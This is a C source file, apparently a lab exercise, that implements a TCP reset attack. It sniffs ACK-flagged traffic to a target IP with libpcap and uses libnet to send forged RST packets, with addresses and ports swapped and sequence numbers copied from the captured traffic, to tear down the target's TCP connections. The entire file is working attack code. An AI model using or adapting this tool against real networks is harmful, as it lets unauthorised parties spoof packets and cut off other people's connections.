#include <stdlib.h>
#include <pcap.h>
#include <libnet.h>
#include <pcap/pcap.h>
#include <linux/ip.h>
#include <netinet/tcp.h>
#include <net/ethernet.h>

typedef struct _cb_data
{
    libnet_t *lnet;
    libnet_ptag_t ip_tag;
    libnet_ptag_t tcp_tag;
} cb_data;
/**
  * @brief Set packet filter to filter ACK packet only
  * @param hdlr pcap_t
  * @param target_ip
  * return 0 if success
  */
int set_packet_filter(pcap_t *hdlr, char *target_ip);

/**
  * @brief Callback function when a packet captured
  */
void caught_packet(u_char *user_args, const struct pcap_pkthdr *cap_header, const u_char *packet);

int main(int argc, char **argv)
{
    if (argc < 3) {
        printf("usage : ./%s <interface> <target IP>\n", argv[0]);
        exit(EXIT_SUCCESS);
    }
    char *interface = argv[1];
    char *target = argv[2];
    char lnet_errbuf[LIBNET_ERRBUF_SIZE];

    /* Open network interface */
    libnet_t *lnet = libnet_init(LIBNET_RAW4, interface, lnet_errbuf);
    if (!lnet) {
        fprintf(stderr, "Error init libnet interface %s\n", lnet_errbuf);
        exit(EXIT_FAILURE);
    }

    char pcap_errbuf[PCAP_ERRBUF_SIZE];

    /* Open pcap handle (pcap_open_live) */
    pcap_t *hdlr = pcap_open_live(interface, 1024, 1, 1000, pcap_errbuf);
    if (!hdlr) {
        fprintf(stderr, "Error open pcap  handler %s\n", pcap_errbuf);
        exit(EXIT_FAILURE);
    }


    /* Random seed */
    libnet_seed_prand(lnet);

    /* Set packet filter to filter ACK packet only */
    set_packet_filter(hdlr, target);

    /* Start capture packet (pcap_loop) */
    cb_data *data = (cb_data *)calloc(1, sizeof(cb_data));
    data->lnet = lnet;
    pcap_loop(hdlr, 0, caught_packet, (u_char *)data);

    /* Release resource */
    libnet_destroy(lnet);
    pcap_close(hdlr);

    return 0;
}

int set_packet_filter(pcap_t *hdlr, char *target_ip) {
    struct bpf_program pgm;
    char str[1024];
    snprintf(str, 1024, "dst %s and tcp[tcpflags] & tcp-ack != 0", target_ip);
    if (pcap_compile(hdlr, &pgm, str, 1, PCAP_NETMASK_UNKNOWN) == -1) {
        fprintf(stderr, "Error compile expression with pcap\n");
        return -1;
    }
    if (pcap_setfilter(hdlr, &pgm) == -1) {
        fprintf(stderr, "Error set pcap filter\n");
        return -1;
    }
    return 0;
}

void caught_packet(u_char *user_args, const struct pcap_pkthdr *cap_header, const u_char *packet)
{
    cb_data *data = (cb_data *)user_args;

    /* Build packet tcp part (RESET flags enabled) (libnet_build_tcp)*/
    struct tcphdr *tcp_hdr = (struct tcphdr *)(packet + sizeof(struct ether_header) + sizeof(struct iphdr));
    data->tcp_tag = libnet_build_tcp(
                ntohs(tcp_hdr->th_dport),               /* source TCP port */
                ntohs(tcp_hdr->th_sport),             /* destination TCP port */
                ntohl(tcp_hdr->th_ack),             /* sequence number */
                //libnet_get_prand(LIBNET_PRu16),     /* acknoledgement number */
                9999,                              /* acknoledgement number */
                TH_RST,                             /* control flags */
                1024,                               /* Windows size */
                0,                                  /* checksum */
                0,                                  /* urgent pointer */
                LIBNET_TCP_H,                       /* TCP packet size */
                NULL,                               /* payload */
                0,                                  /* payload length */
                data->lnet,                                /* libnet context */
                data->tcp_tag                             /* ptag */
            );

    /* Build packet ip part (libnet_build_ip)*/
    struct iphdr *ip_hdr = (struct iphdr *)(packet + sizeof(struct  ether_header));
    data->ip_tag = libnet_build_ipv4(
                    LIBNET_TCP_H + LIBNET_IPV4_H,       /* Total packet len */
                    IPTOS_LOWDELAY,                     /* tos */
                    libnet_get_prand(LIBNET_PR16),      /* IP ID */
                    0,                                  /* IP Frag */
                    64,                                 /* TTL */
                    IPPROTO_TCP,                        /* Upper layer protocol */
                    0,                                  /* Checksum */
                    ip_hdr->daddr,               /* Source ip */
                    ip_hdr->saddr,                /* Dest ip */
                    NULL,                               /* Payload */
                    0,                                  /* Payload size */
                    data->lnet,                         /* libnet context */
                    data->ip_tag                        /* ptag */
                );


    /* Send packet to network */ 
    int res = libnet_write(data->lnet);
    if (res != -1)
        printf("Successfully write packet sequence %u from %u to %u\n", ntohl(tcp_hdr->th_ack), ntohs(tcp_hdr->th_dport), ntohs(tcp_hdr->th_sport));
    else
        printf("%d\n", res);

    usleep(5000);
}
